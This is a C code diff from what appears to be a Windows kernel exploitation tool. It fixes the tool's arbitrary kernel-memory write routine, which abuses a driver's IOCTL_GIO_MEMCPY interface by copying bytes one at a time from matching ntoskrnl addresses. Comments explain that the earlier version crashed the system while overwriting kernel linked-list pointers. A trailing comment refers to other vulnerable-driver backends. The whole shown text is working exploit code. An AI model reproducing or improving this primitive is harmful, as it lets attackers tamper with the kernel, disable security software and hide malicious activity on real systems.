@@ -332,19 +332,25 @@ static BOOL gdrv_read(UINT64 kva, DWORD sz, UINT64 *out) {
 static BOOL gdrv_write(UINT64 kva, UINT64 val, DWORD sz) {
     if(g_hDev == INVALID_HANDLE_VALUE) return FALSE;
     DWORD br;
-    /* Find a kernel-space address whose byte equals val.
-       For 0: use ntoskrnl_kva+3 (always 0x00 in DOS stub).
-       For any other value: scan ntoskrnl PE header on disk for a stable matching byte. */
-    UINT64 src = find_kbyte_in_ntoskrnl((UINT8)val);
-    if(!src) {
-        logf("[!] gdrv kwrite: no kernel src for val=0x%02llX", (unsigned long long)val);
-        return FALSE;
+    /* Write each byte individually: for each byte of val, find a kernel address
+       whose byte equals that value and GIO_MEMCPY 1 byte (kernel→kernel, SMAP-safe).
+       Writing sz bytes from a single 1-byte source copies adjacent ntoskrnl garbage —
+       that was corrupting LIST_ENTRY Flink/Blink for 8-byte pointer writes → BSOD 0x139. */
+    for(DWORD i = 0; i < sz; i++) {
+        UINT8 byte = (UINT8)((val >> (i * 8)) & 0xFF);
+        UINT64 src = find_kbyte_in_ntoskrnl(byte);
+        if(!src) {
+            logf("[!] gdrv kwrite: no kernel src for byte 0x%02X at offset %u", byte, i);
+            return FALSE;
+        }
+        GIO_MEMCPY_IN req = {(ULONG_PTR)(kva + i), (ULONG_PTR)src, 1};
+        BOOL ok = DeviceIoControl(g_hDev, IOCTL_GIO_MEMCPY, &req, sizeof(req), NULL, 0, &br, NULL);
+        if(!ok) {
+            logf("[!] gdrv kwrite byte[%u]=0x%02X IOCTL err=%lu", i, byte, GetLastError());
+            return FALSE;
+        }
     }
-    /* Both dst and src are kernel addresses → SMAP-safe */
-    GIO_MEMCPY_IN req = {(ULONG_PTR)kva, (ULONG_PTR)src, sz};
-    BOOL ok = DeviceIoControl(g_hDev, IOCTL_GIO_MEMCPY, &req, sizeof(req), NULL, 0, &br, NULL);
-    if(!ok) logf("[!] gdrv kwrite(0x%02llX) IOCTL err=%lu", (unsigned long long)val, GetLastError());
-    return ok;
+    return TRUE;
 }
 
 /* physical R/W helpers (used by LNV and TS backends) */
